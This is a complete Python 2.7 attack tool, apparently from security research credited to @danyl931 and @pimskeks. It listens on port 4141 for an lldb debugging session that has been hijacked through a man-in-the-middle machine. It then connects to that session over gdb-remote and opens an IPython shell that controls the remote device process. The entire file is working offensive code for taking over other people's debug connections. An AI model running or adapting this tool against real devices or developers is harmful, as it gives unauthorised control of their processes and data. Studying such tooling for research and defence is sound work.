#!/usr/bin/env python2.7

import sys
import struct
import socket
import IPython
import argparse
import subprocess

lldb = None

def log_info(fmt, *args, **kwargs):
	print('[*] ' + fmt.format(*args, **kwargs))

def log_error(fmt, *args, **kwargs):
	print('[!] ' + fmt.format(*args, **kwargs))

def drop_to_lldb_ipython(sock):
	log_info("Dropping to lldb-ipython session");

	debugger = lldb.SBDebugger.Create()
	target = debugger.CreateTarget('')
	listener = debugger.GetListener()
	error = lldb.SBError()

	debugger.SetAsync(True)

	log_info("Connecting to hijacked session")
	process = target.ConnectRemote(
		listener,
		'fd://{}'.format(sock.fileno()),
		'gdb-remote',
		error
	)

	event = lldb.SBEvent()
	success = (
		process != None and
		error.success and
		listener.WaitForEvent(1, event) and
		lldb.SBProcess.EventIsProcessEvent(event) and
		lldb.SBProcess.GetStateFromEvent(event) in (lldb.eStateConnected, lldb.eStateStopped)
	)

	if success == False:
		log_error("Failed to connect")
		return

	log_info("Starting ipython")
	IPython.embed()


def read_tlv_packet(sock):
		size = sock.recv(8)
		actual_size = struct.unpack('<Q', size)[0]
		data = None

		if actual_size > 0:
			data = ''
			received = 0
			while (received < actual_size):
				d = sock.recv(actual_size - received)
				received += len(d)
				data += d

		return data

def get_hijacked_session(address, port):
	log_info("Listening for hijacked session at {}:{}", address, port);

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	sock.bind((address, port))
	sock.listen(1)

	client_sock, addr = sock.accept()
	log_info("Got connection from: {}:{}", *addr);

	hijacked_address = read_tlv_packet(client_sock)
	if hijacked_address is None:
		log_error("Failed to read hijacked address");
		return None

	log_info("Hijacked session: {}", hijacked_address)
	return client_sock

def get_iface_ipv4_addr(iface):
	try:
		proc = subprocess.Popen(['ifconfig', iface], stdout=subprocess.PIPE)
		for l in iter(proc.stdout.readline, ''):
			if l.startswith('\tinet '):
				return l.split(' ')[1]
	except:
		pass

	log_error("Failed to get ip for iface: {}", iface)
	return None

def load_lldb():
	proc = subprocess.Popen(['lldb', '-P'], stdout=subprocess.PIPE)
	lldb_module_path = proc.stdout.read()[:-1]
	
	if lldb_module_path[-1] == '3':
		lldb_module_path = lldb_module_path[:-1]
	sys.path.insert(0, lldb_module_path)
	
	import lldb
	return lldb

def parse_args():
	parser = argparse.ArgumentParser()
	parser.add_argument(
		'-i',
		'--interface',
		dest='iface',
		help="External interface name, accesible by device and MITM machine",
		required=True
	)

	return parser.parse_args()

def print_header():
	print("          __      _           _");
	print("      __ /  \\ _ _| |_ _____ _| |_ ___ _ __ _  _");
	print("     / _| () | ' \\  _/ -_) \\ /  _/ _ \\ '  \\ || |");
	print("     \\__|\\__/|_||_\\__\\___/_\\_\\\\__\\___/_|_|_\\_, |");
	print("       (c) 2019-2020 @danyl931 @pimskeks   |__/\n");
	print("\tA simple tool to listen to a single hijacked lldb");
	print("\tconnection and drop to an ipython session.\n");
	print("\tAvailable variables:");
	print("\t\tdebugger - An SBDebugger object");
	print("\t\ttarget - SBTarget object");
	print("\t\tprocess - SBProcess object, connected to the hijacked session\n");
	print("\tTo properly exit without corrupting the original");
	print("\tsession please detach using 'process.Detach()'.\n");

def main():
	print_header()
	args = parse_args()
	
	address = get_iface_ipv4_addr(args.iface)
	if address is None:
		return

	global lldb
	lldb = load_lldb()
	if lldb is None:
		return

	sock = get_hijacked_session(address, 4141)
	if sock is None:
		return

	drop_to_lldb_ipython(sock)

if __name__ == '__main__':
	main()